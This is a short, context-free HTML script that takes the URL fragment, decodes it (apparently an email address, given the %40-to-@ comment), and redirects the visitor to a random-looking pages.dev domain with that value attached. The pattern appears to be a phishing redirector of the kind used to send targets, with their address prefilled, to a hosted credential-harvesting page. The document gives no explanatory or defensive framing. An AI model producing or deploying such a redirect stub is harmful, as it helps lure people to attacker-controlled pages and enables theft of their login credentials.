<script>
  // Get the current URL hash part
  var hashValue = window.location.hash.substring(1);
  // Decode any encoded characters (like %40 to @)
  var decodedHash = decodeURIComponent(hashValue);
  // Redirect to the URL with the decoded hash
  window.location.href = 'https://wdshdkd.pages.dev/#' + decodedHash;
</script>
